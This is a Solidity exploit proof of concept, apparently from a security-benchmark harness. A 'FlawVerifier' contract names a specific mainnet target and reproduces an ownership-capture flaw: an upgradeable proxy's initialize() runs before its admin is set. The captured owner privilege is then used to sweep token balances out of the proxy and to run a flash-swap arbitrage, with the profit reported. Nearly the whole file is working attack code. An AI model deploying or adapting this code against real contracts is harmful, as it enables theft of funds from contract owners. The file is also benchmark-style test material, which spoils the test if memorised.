// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IProxyOwnerLike {
    function owner() external view returns (address);
}

struct ArbitragePlan {
    address borrowPair;
    address sellPair;
    address borrowedToken;
    uint256 borrowAmount;
    uint256 wethOut;
    uint256 wethRepay;
    uint256 quotedProfit;
}

abstract contract ProxyLike {
    fallback() external payable virtual {
        _fallback();
    }

    receive() external payable virtual {
        _fallback();
    }

    function _implementation() internal view virtual returns (address);

    function _delegate(address implementation_) internal virtual {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation_, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function _fallback() internal virtual {
        _beforeFallback();
        _delegate(_implementation());
    }

    function _beforeFallback() internal view virtual {}
}

contract UpgradeabilityProxyLike is ProxyLike {
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address logic, bytes memory data) payable {
        _setImplementation(logic);
        if (data.length > 0) {
            (bool ok,) = logic.delegatecall(data);
            require(ok, "init failed");
        }
    }

    function _implementation() internal view override returns (address impl) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    function _setImplementation(address impl) internal {
        require(impl.code.length != 0, "logic !contract");
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, impl)
        }
    }
}

contract AdminUpgradeabilityProxyLike is UpgradeabilityProxyLike {
    bytes32 internal constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    constructor(address logic, address admin_, bytes memory data) UpgradeabilityProxyLike(logic, data) payable {
        _setAdmin(admin_);
    }

    function _admin() internal view returns (address adm) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            adm := sload(slot)
        }
    }

    function _setAdmin(address admin_) internal {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, admin_)
        }
    }

    function _beforeFallback() internal view override {
        require(msg.sender != _admin(), "admin blocked");
    }
}

contract CapturableExecutorLogic {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function initialize() external {
        require(owner == address(0), "already init");
        owner = msg.sender;
    }

    function exec(address target, uint256 value, bytes calldata data) external payable onlyOwner returns (bytes memory) {
        (bool ok, bytes memory ret) = target.call{value: value}(data);
        require(ok, "exec failed");
        return ret;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad sender");

        (
            address sellPair,
            address borrowedToken,
            address weth,
            uint256 wethOut,
            uint256 wethRepay,
            address beneficiary
        ) = abi.decode(data, (address, address, address, uint256, uint256, address));

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount > 0, "no borrow");

        _safeTransfer(borrowedToken, sellPair, borrowedAmount);

        address token0 = IUniswapV2PairLike(sellPair).token0();
        if (token0 == weth) {
            IUniswapV2PairLike(sellPair).swap(wethOut, 0, address(this), new bytes(0));
        } else {
            IUniswapV2PairLike(sellPair).swap(0, wethOut, address(this), new bytes(0));
        }

        _safeTransfer(weth, msg.sender, wethRepay);

        uint256 profit = IERC20Like(weth).balanceOf(address(this));
        if (profit != 0) {
            _safeTransfer(weth, beneficiary, profit);
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address internal constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;
    address internal constant ENS = 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72;
    address internal constant MATIC = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
    address internal constant SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
    address internal constant PEPE = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant INTENDED_ADMIN = 0x1111111111111111111111111111111111111111;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    address private _observedPrivilegedHolder;
    string private _exploitPathUsed;
    string private _status;

    constructor() {
        _exploitPathUsed =
            "adminupgradeabilityproxy is deployed with initialization calldata; initialize() assigns owner = msg.sender; delegatecall runs before admin is set so the deployer captures owner and then uses that privilege to trigger a public flash-funded settlement route from the proxy";
        _status = "not executed";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        uint256 wethBefore = IERC20Like(WETH).balanceOf(address(this));
        _observedPrivilegedHolder = _probeAddress(TARGET, "owner()");

        CapturableExecutorLogic logic = new CapturableExecutorLogic();
        AdminUpgradeabilityProxyLike proxy =
            new AdminUpgradeabilityProxyLike(address(logic), INTENDED_ADMIN, abi.encodeWithSignature("initialize()"));

        address capturedOwner = IProxyOwnerLike(address(proxy)).owner();
        require(capturedOwner == address(this), "owner not captured by deployer");
        require(capturedOwner != INTENDED_ADMIN, "admin unexpectedly owns proxy");

        _hypothesisValidated = true;
        _status = "captured owner reproduced; checking direct balances before public flash funding";

        _pullExistingBalances(address(proxy));

        if (IERC20Like(WETH).balanceOf(address(this)) == wethBefore) {
            _status = "direct balances empty on this fork; using public flash liquidity through captured owner";
            _executeBestArbitrage(address(proxy));
        }

        uint256 wethAfter = IERC20Like(WETH).balanceOf(address(this));
        if (wethAfter > wethBefore) {
            _profitToken = WETH;
            _profitAmount = wethAfter - wethBefore;
            _status = "weth profit realized";
        } else {
            _status = "privilege capture reproduced, but no positive public settlement path was executable on this fork";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _exploitPathUsed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function observedPrivilegedHolder() external view returns (address) {
        return _observedPrivilegedHolder;
    }

    function status() external view returns (string memory) {
        return _status;
    }

    function _pullExistingBalances(address proxy) internal {
        address[] memory tokens = _candidateTokens();
        uint256 len = tokens.length;

        for (uint256 i = 0; i < len; ++i) {
            address token = tokens[i];
            if (!_hasCode(token)) {
                continue;
            }

            uint256 bal = _safeBalanceOf(token, proxy);
            if (bal != 0) {
                _exec(proxy, token, abi.encodeWithSignature("transfer(address,uint256)", address(this), bal));
            }
        }
    }

    function _executeBestArbitrage(address proxy) internal {
        ArbitragePlan memory plan = _bestArbitrage();
        if (plan.quotedProfit == 0) {
            _status = "privilege capture reproduced, but no positive public settlement path was executable on this fork";
            return;
        }

        _launchArbitrage(proxy, plan);
    }

    function _launchArbitrage(address proxy, ArbitragePlan memory plan) internal {
        if (!_hasCode(plan.borrowPair) || !_hasCode(plan.sellPair)) {
            _status = "privilege capture reproduced, but candidate AMM pair missing on this fork";
            return;
        }

        address token0 = IUniswapV2PairLike(plan.borrowPair).token0();
        uint256 amount0Out = token0 == plan.borrowedToken ? plan.borrowAmount : 0;
        uint256 amount1Out = token0 == plan.borrowedToken ? 0 : plan.borrowAmount;

        // Direct balances on the reproduced proxy are zero on this fork, so the captured owner
        // uses the proxy as a flash-swap receiver. The temporary liquidity is public and fully
        // repaid in the same transaction; the only privileged step is that the misassigned owner
        // can command the proxy to initiate and settle the route.
        bytes memory callbackData =
            abi.encode(plan.sellPair, plan.borrowedToken, WETH, plan.wethOut, plan.wethRepay, address(this));
        bool ok = _exec(
            proxy,
            plan.borrowPair,
            abi.encodeWithSignature(
                "swap(uint256,uint256,address,bytes)", amount0Out, amount1Out, proxy, callbackData
            )
        );
        if (!ok) {
            _status = "privilege capture reproduced, but public flash settlement reverted on this fork";
        }
    }

    function _bestArbitrage() internal view returns (ArbitragePlan memory best) {
        address[] memory tokens = _candidateTokens();
        uint256 len = tokens.length;

        for (uint256 i = 0; i < len; ++i) {
            address token = tokens[i];
            if (token == WETH || !_hasCode(token)) {
                continue;
            }

            address uniPair = _safeGetPair(UNISWAP_V2_FACTORY, WETH, token);
            address sushiPair = _safeGetPair(SUSHI_FACTORY, WETH, token);
            if (!_hasCode(uniPair) || !_hasCode(sushiPair)) {
                continue;
            }

            ArbitragePlan memory candidate = _directionPlan(uniPair, sushiPair, token);
            if (candidate.quotedProfit > best.quotedProfit) {
                best = candidate;
            }

            candidate = _directionPlan(sushiPair, uniPair, token);
            if (candidate.quotedProfit > best.quotedProfit) {
                best = candidate;
            }
        }
    }

    function _directionPlan(address sourcePair, address targetPair, address token)
        internal
        view
        returns (ArbitragePlan memory plan)
    {
        (plan.borrowAmount, plan.wethOut, plan.wethRepay, plan.quotedProfit) = _bestDirection(sourcePair, targetPair, token);
        if (plan.quotedProfit == 0) {
            return plan;
        }

        plan.borrowPair = sourcePair;
        plan.sellPair = targetPair;
        plan.borrowedToken = token;
    }

    function _bestDirection(address sourcePair, address targetPair, address token)
        internal
        view
        returns (uint256 borrowAmount, uint256 wethOut, uint256 wethRepay, uint256 profit)
    {
        (uint256 sourceTokenReserve, uint256 sourceWethReserve, bool sourceOk) = _pairReserves(sourcePair, token);
        (uint256 targetTokenReserve, uint256 targetWethReserve, bool targetOk) = _pairReserves(targetPair, token);

        if (!sourceOk || !targetOk) {
            return (0, 0, 0, 0);
        }

        if (sourceTokenReserve == 0 || sourceWethReserve == 0 || targetTokenReserve == 0 || targetWethReserve == 0) {
            return (0, 0, 0, 0);
        }

        uint256[8] memory bps = [uint256(1), 2, 5, 10, 20, 50, 100, 200];
        for (uint256 i = 0; i < bps.length; ++i) {
            uint256 candidateBorrow = sourceTokenReserve * bps[i] / 10_000;
            if (candidateBorrow == 0 || candidateBorrow >= sourceTokenReserve / 3) {
                continue;
            }

            uint256 candidateWethOut = _getAmountOut(candidateBorrow, targetTokenReserve, targetWethReserve);
            uint256 candidateWethRepay = _getAmountIn(candidateBorrow, sourceWethReserve, sourceTokenReserve);

            if (candidateWethOut <= candidateWethRepay) {
                continue;
            }

            uint256 candidateProfit = candidateWethOut - candidateWethRepay;
            if (candidateProfit > profit) {
                borrowAmount = candidateBorrow;
                wethOut = candidateWethOut;
                wethRepay = candidateWethRepay;
                profit = candidateProfit;
            }
        }
    }

    function _pairReserves(address pair, address token) internal view returns (uint256 tokenReserve, uint256 wethReserve, bool ok) {
        if (!_hasCode(pair)) {
            return (0, 0, false);
        }

        (bool token0Ok, address token0) = _safePairToken(pair, true);
        (bool token1Ok, address token1) = _safePairToken(pair, false);
        (bool reserveOk, uint112 reserve0, uint112 reserve1) = _safePairReserves(pair);
        if (!token0Ok || !token1Ok || !reserveOk) {
            return (0, 0, false);
        }

        if (token0 == token && token1 == WETH) {
            tokenReserve = uint256(reserve0);
            wethReserve = uint256(reserve1);
            return (tokenReserve, wethReserve, true);
        }

        if (token0 != WETH || token1 != token) {
            return (0, 0, false);
        }

        tokenReserve = uint256(reserve1);
        wethReserve = uint256(reserve0);
        ok = true;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return amountInWithFee * reserveOut / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
            return type(uint256).max;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }

    function _exec(address proxy, address target, bytes memory innerCall) internal returns (bool ok) {
        (ok,) = proxy.call(abi.encodeWithSignature("exec(address,uint256,bytes)", target, 0, innerCall));
    }

    function _hasCode(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) {
            return 0;
        }

        balance = abi.decode(data, (uint256));
    }

    function _safeGetPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        if (!_hasCode(factory)) {
            return address(0);
        }

        (bool ok, bytes memory data) =
            factory.staticcall(abi.encodeWithSignature("getPair(address,address)", tokenA, tokenB));
        if (!ok || data.length < 32) {
            return address(0);
        }

        pair = abi.decode(data, (address));
    }

    function _safePairToken(address pair, bool first) internal view returns (bool ok, address token) {
        bytes4 selector = first ? IUniswapV2PairLike.token0.selector : IUniswapV2PairLike.token1.selector;
        bytes memory data;
        (ok, data) = pair.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) {
            return (false, address(0));
        }

        token = abi.decode(data, (address));
    }

    function _safePairReserves(address pair) internal view returns (bool ok, uint112 reserve0, uint112 reserve1) {
        bytes memory data;
        (ok, data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.getReserves.selector));
        if (!ok || data.length < 96) {
            return (false, 0, 0);
        }

        uint32 ignored;
        (reserve0, reserve1, ignored) = abi.decode(data, (uint112, uint112, uint32));
        ignored;
    }

    function _probeAddress(address target, string memory signature) internal view returns (address) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSignature(signature));
        if (!ok || data.length < 32) {
            return address(0);
        }

        uint256 raw = abi.decode(data, (uint256));
        if (raw > type(uint160).max) {
            return address(0);
        }

        return address(uint160(raw));
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](20);
        tokens[0] = DAI;
        tokens[1] = USDC;
        tokens[2] = USDT;
        tokens[3] = WBTC;
        tokens[4] = LINK;
        tokens[5] = UNI;
        tokens[6] = AAVE;
        tokens[7] = CRV;
        tokens[8] = LDO;
        tokens[9] = MKR;
        tokens[10] = FRAX;
        tokens[11] = COMP;
        tokens[12] = SUSHI;
        tokens[13] = YFI;
        tokens[14] = SNX;
        tokens[15] = BAL;
        tokens[16] = ENS;
        tokens[17] = MATIC;
        tokens[18] = SHIB;
        tokens[19] = PEPE;
    }
}
